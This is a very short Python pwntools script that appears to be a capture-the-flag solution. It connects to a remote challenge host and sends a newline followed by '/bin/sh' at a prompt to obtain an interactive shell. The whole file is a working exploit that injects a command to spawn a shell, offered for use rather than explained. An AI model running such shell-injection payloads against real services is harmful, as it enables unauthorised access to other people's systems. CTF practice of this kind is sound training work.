from pwn import *

r = remote('ctf.kuality.kr',12346)
#context.log_level = 'debug'

r.sendlineafter('> ','\n'+'/bin/sh')
r.interactive()